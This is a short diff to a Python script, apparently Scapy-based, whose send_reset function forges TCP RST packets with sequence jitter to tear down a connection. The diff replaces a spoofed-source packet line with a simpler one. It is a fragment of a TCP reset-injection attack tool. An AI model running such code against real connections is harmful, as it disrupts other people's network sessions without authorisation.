@@ -97,7 +97,8 @@ def send_reset(iface, seq_jitter=0, ignore_syn=True):
             print("jitter == 0, this RST packet should close the connection")
 
         rst_seq = ack + jitter
-        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
+        #p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
+        p = IP(dst=dst_ip) / TCP(dport=dst_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
 
         log(
             "Sending RST packet...",
